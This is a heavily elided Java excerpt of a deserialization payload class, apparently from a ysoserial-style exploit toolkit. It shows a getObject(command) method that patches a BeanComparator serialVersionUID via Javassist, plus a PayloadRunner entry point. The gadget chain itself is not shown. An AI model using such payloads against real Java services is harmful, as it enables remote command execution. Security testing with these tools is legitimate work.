...
public class CommonsBeanutils2_15 implements ObjectPayload<Object> {
    ...
    public Object getObject(String command) throws Exception {
        ...
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = 5123381023979609048L;", ctBeanComparator));
    ...
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils2_15.class, args);
    }
}
